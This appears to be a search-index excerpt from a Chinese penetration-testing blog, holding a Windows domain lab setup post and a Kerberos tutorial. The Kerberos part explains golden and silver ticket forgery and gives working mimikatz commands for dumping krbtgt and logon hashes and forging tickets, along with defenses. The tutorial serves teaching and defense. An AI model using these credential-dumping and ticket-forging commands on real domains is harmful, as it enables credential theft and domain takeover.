flag-3：04787ddef27c3dee1ee161b21670b4e4","categories":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://tryhard3r.github.io/categories/Vulnhub/"}],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://tryhard3r.github.io/tags/Vulnhub/"}]},{"title":"从0开始搭建自己的域环境(单域)","slug":"从0开始搭建自己的域环境-单域","date":"2020-02-26T10:57:28.000Z","updated":"2020-03-31T07:02:54.000Z","comments":true,"path":"p/cc0d.html","link":"","permalink":"https://tryhard3r.github.io/p/cc0d.html","excerpt":"","text":"环境准备 DC：Windows Server 2008 R2 Enterprise SP1 X64 DM：Windows Server 2003 Enterprise SP2 X64 DM：Windows 7 Ultimate SP1 X64 域控配置配置静态IP 安装活动目录角色 域服务安装向导 PS：Windows NT 4.0 兼容的加密算法指的是低版本的SMB v1客户端，在进行NTLM网络认证时使用的加密算法比较简单容易被破解。其次，未升级到SMB v2的服务器可能会受到Pass The Hash的技术手段利用、MS17-010等漏洞的危害，为了后续的学习直接选择下一步即可 PS：我们现在只有这一个域环境，因此选择在新林中新建域 PS：必须符合DNS对域名的名称标准规范 PS：为了保证向下兼容，林功能级别和域功能级别都选择Windows Server 2003 PS：这里可以看到之前选择的所有配置，这里也可以导出设置，用于下次安装的时候自动配置 PS：安装完成重启后默认使用域内账户Administrator登录 加入域新建域用户 按照相同步骤再新建一个用户，一个给Windows 2003，一个给Windows 7 Windows Server 2003 PS：DNS服务器设置为域控的IP地址 PS：重新启动后就可以选择登录到本地计算机还是域 Windows 7 配置IIS(域用户身份)虚拟机先连接之前安装Windows 2003的镜像，后面可能会用到 先用Administrator登录到本地计算机将域用户添加到本地管理员组 win+R运行lusrmgr.msc 注销系统再以域用户James登录到域 看到这个页面说明IIS安装成功 查看默认的网站根目录 配置MSSQL(域用户身份)SQL Server 2005 Enterprise下载：链接：https://pan.baidu.com/s/1gDfhn13xO864USFmLZdJMA提取码：zq3a 参考资料最快的方式搭建域环境","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://tryhard3r.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://tryhard3r.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]},{"title":"Windows认证之Kerberos","slug":"Windows认证之Kerberos","date":"2020-02-18T06:28:57.000Z","updated":"2020-02-22T10:17:50.000Z","comments":true,"path":"p/4653.html","link":"","permalink":"https://tryhard3r.github.io/p/4653.html","excerpt":"","text":"Kerberos概述 Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。 MIT Kerberos官网中Kerberos的图片是一只三头狗，其实这恰好就对应了Kerberos认证流程中的3个角色： Client：需要访问服务的Client Server：提供服务的Server KDC(Key Distribution Center)：密钥分发中心，负责管理票据、认证票据、分发票据，主要由AS和TGS两个服务组成。AS即Authentication Service，为Client生成TGT票据；TGS即Ticket Granting Service，为Client生成访问某服务的票据（注意TGT票据和票据的区别，TGT票据是一种临时凭据，通过TGT票据可以获得票据），通常情况下KDC由域控来担任。 Kerberos认证流程 在深入理解Kerberos认证的每一个步骤之前，我们先通过一张图简单了解Kerberos认证的大致流程： 可以看出Kerberos整个认证流程还是比较好理解，但是实际认证过程中会涉及到很多信息和各种加密方式，下面我们对每一个步骤进行剖析： 长期密钥（Long-term Key） 在安全领域中，有的密钥可能长期内保持不变，比如密码，可能几年都不曾改变。这样的密钥以及由此派生的其他密钥被称为长期密钥。长期密钥有这样的原则：被长期密钥加密的数据不应该在网络上传输。因为任何加密算法都不可能做到绝对保密，一旦这些被长期密钥加密的数据包被黑客截获，在理论上，只要有充足的时间，都是可以通过计算获得用户用于加密的密钥的。 对于一个账户来说，密码仅限于该账户的所有者知晓，甚至对于管理员都应该是保密的。但是密码却又是证明身份的凭据，所以必须通过基于密码的派生信息来证明用户的真实身份，在这种情况下，一般将账户密码进行Hash运算得到一个Hash值，也可以称之为主密钥（Master Key）。由于Hash算法是不可逆的，同时可以保证密码和主密钥派生的确定性，这样既保证了密码的保密性，同时又保证主密钥和密码本身在证明用户身份时具有相同的效力。 短期密钥（Short-term Key） 由于被长期密钥加密的数据包不能在网络上传送，所以需要使用另一种密钥来加密需要进行网络传输的数据。这种密钥只在一段时间内有效，即使加密过的数据包被黑客截获，等他把密钥计算出来的时候，这个密钥早就已经过期了。我们把这种密钥称为短期密钥。比如Session Key。 AS_REQ：Client将域用户密码Hash一次得到Master Key并保存，作为Client和KDC的长期密钥。（DC上的Account Database也保存着一份该用户的Master Key）Client使用Master Key将timestamp加密得到Pre-authentication data，Pre-authentication data、Client Info（包含用户名）、Server Info一起组成AS Request发送给AS AS_REP：KDC根据Client用户名查找AD是否可信，若可信，则从AD中提取出该用户对应的NTLM Hash（也就是Master Key）进行解密，若解密成功并且时间戳在合理时间内则返回两个凭据： KDC生成一个随机的字符串作为Session Key，用于后续Client和TGS通信，再用Master Key对Session Key加密后返回给Client 使用krbtgt用户（一个特殊用户，用于Kerberos身份验证）的NTLM Hash对Session Key和Client Info进行加密生成TGT返回给Client。TGT的内容Client是无法解密的，因为正常情况下Client没有krbtgt的NTLM Hash，如果拥有krbtgt的NTLM Hash，我们就可以自己签发任意用户的TGT票据，这个票据也被称为黄金票据 TGS_REQ：Client收到AS返回的两个凭据，先用Master Key解密得到Session Key，再用Session Key加密Client Info、timestamp、End Time得到Authenticator，然后向TGS发送TGS_REQ请求，请求主体包括：TGT、Authenticator、Client Info、Server Info TGS_REP：TGS收到请求先用krbtgt Hash对TGT进行解密，因为TGT中包含了Session Key，然后再用Session Key去解密Authenticator得到Client Info和timestamp，将此处得到的Client Info去和TGT中的Client Info去进行验证，若一致且时间戳在合理时间内则认证通过。此时TGS再生成一个随机字符串作为Server Session Key，用于后续Client和Server通信。同时根据Server Info从AD中提取出Server对应的NTLM Hash，使用Server Hash对Server Session Key、Client Info、End Time加密生成Ticket，再用之前的Session Key对Server Session Key进行加密后连同Ticket一起返回给Client AP_REQ：Client收到TGS返回的两个凭据后，使用Session Key解密得到Server Session Key，而Ticket正常情况下Client是无法解密的，因为没有Server Hash，如果我们有了Server Hash，就可以伪造一个不经过KDC认证的一个Ticket，这个票据也被称为白银票据。使用Server Session Key加密Client Info和timestamp，连同Ticket一起发送给Server AP_REP：Server收到请求后，使用Server Hash解密Ticket，因为Ticket中包含了Server Session Key，得到了Server Session Key后再去解密Server Session Key(Client Info，timestamp)得到Client Info和timestamp，将此处得到的Client Info和Ticket中的Client Info进行验证，若一致且时间戳在合理时间内则认证成功，该票据会一直保存在Client的内存中 仔细思考不难发现，对于TGS_REP和AP_REP，TGS和Server背后的处理逻辑其实是非常类似的，我们可以把这个逻辑抽象出来用一个比喻来更加形象的描述：假设你手中有且仅有一把钥匙，我现在给你两个宝箱，你手中的这把钥匙只能打开其中一个，但是你打开的那个宝箱中存放着打开另一个宝箱的钥匙，这样你就能成功打开两个宝箱获得所有物品。 攻击Kerberos 任何目标在保证实现的情况下应该追求简单高效，一旦步骤多了就必然出现纰漏。Kerberos虽然流程理解起来比较简单，但是认证步骤却不少，这就导致其中某些步骤产生漏洞从而受到攻击。 计算机是死的，人是活的。Kerberos是基于票据认证的，也就是说不管是合法用户还是攻击者，只要能拿出合法票据，就能获得相应权限。 针对Kerberos的攻击方式有很多种，主要是针对Kerberos认证不同阶段的攻击，限于篇幅原因这里暂时不一一展开，选择最为常见最为经典的黄金票据和白银票据进行演示讲解，注意无论是黄金票据还是白银票据，其本质都只是生成的一个具体票据，并不是一种攻击手法，这两者都属于PTT（Pass The Ticket）攻击。 黄金票据 原理：TGT = krbtgt Hash(Session Key，Client Info)，拥有krbtgt Hash我们就可以伪造TGT票据。 利用条件 域名称 域SID krbtgt用户的NTLM Hash或aes256_hmac 伪造用户名，可以是任意的 mimikatz伪造白黄金票据： #列出票据 kerberos::list #清除票据 kerberos::purge#导出krbtgt Hash mimikatz.exe &quot;lsadump::dcsync /domain:god.org /user:krbtgt&quot; &quot;exit&quot; &gt; log.txt #伪造票据（使用krbtgt NTLM Hash） mimikatz.exe &quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;krbtgt NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit #示例 mimikatz.exe &quot;kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /rc4:58e91a5ac358d86513ab224312314061 /user:god /ptt&quot; exit #伪造票据（使用krbtgt aes256_hmac） mimikatz.exe &quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /aes256:&lt;krbtgt aes256_hmac&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit #示例 mimikatz.exe &quot;kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /aes256:a780c2c18b3287e3448562a36dccb2d57d11fd398b55ce2cd9b128308cef74df /user:god /ptt&quot; exit 防护措施： 限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组 经常更新krbtgt用户的密码，若攻击者获得了krbtgt NTLM Hash，通过快速更改krbtgt密码两次，使任何现有的黄金票据以及所有活动的Kerberos票据失效，并消除攻击者使用其KRBTGT创建有效金票的能力 白银票据 原理：Ticket = Server Hash(Server Session Key，Client Info，End Time) ，拥有Server Hash我们就可以伪造一个不经过KDC认证的Ticket。 利用条件 域名称 域SID Server Hash 伪造用户名，可以是任意的 白银票据服务列表 服务类型 服务名 WMI HOST、RPCSS Powershell Remoteing HOST、HTTP WinRM HOST、HTTP Scheduled Tasks HOST LDAP、DCSync LDAP Windows File Share（CIFS） CIFS Windows Remote ServerAdministration Tools RPCSS、LDAP、CIFS mimikatz伪造白银票据： #列出票据 kerberos::list #清除票据 kerberos::purge #导出Server Hash mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt #伪造票据 mimikatz.exe &quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit 防护措施： 尽量保证Server Hash不被窃取。 开启PAC（Privileged Attribute Certificate）特权属性证书保护功能，但这会降低认证效率，增加DC的负担。PAC主要是规定服务器将票据发送给Kerberos服务，由Kerberos服务验证票据是否有效。打开注册表HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Kerberos\\Parameters，新建DWORD值，名称为ValidateKdcPacSignature，值设置为1。 两种票据对比 黄金票据 白银票据 伪造TGT，可以获取任意服务权限，进而实现长时间控制整个域 伪造TGS，只能获取指定服务权限 需要获得krbtgt Hash 需要获得Server Hash 需要访问域控 不需要访问域控 总结 本文先以通俗的语言描述了Kerberos大致认证流程，接着对每一个步骤进一步剖析，这样有利于我们发现每一步中可能存在的安全风险，最后以黄金票据和白银票据为例演示了常见的攻击手法。Kerberos协议可以说是整个域环境的核心，稍有配置不当就可能导致整个域被控制，针对Kerberos的攻击方式和技巧也是五花八门，但是单纯会用工具是远远不够的，我们不仅要知其然，还要知其所以然，只有把Kerberos、NTLM、LDAP等等这些协议原理搞清楚，才能在内网渗透的路上走的更远。 参考资料彻底理解Windows认证 windows-protocol 深刻理解windows安全认证机制 [ntlm &amp; Kerberos] MIT Kerberos Kerberos认证浅析 Kerberos协议探索系列之票据篇 Kerberos的黄金票据详解 Kerberos的白银票据详解","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://tryhard3r.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"域渗透","slug":"域渗透","permalink":"https://tryhard3r.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"}]}],"categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://tryhard3r.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"靶机","slug":"靶机","permalink":"https://tryhard3r.github.io/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://tryhard3r.github.io/categories/Vulnhub/"}],"tags":[{"name":"网络协议","slug":"网络协议","permalink":"https://tryhard3r.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"},{"name":"域渗透","slug":"域渗透","permalink":"https://tryhard3r.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://tryhard3r.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"https://tryhard3r.github.io/tags/Vulnhub/"}]}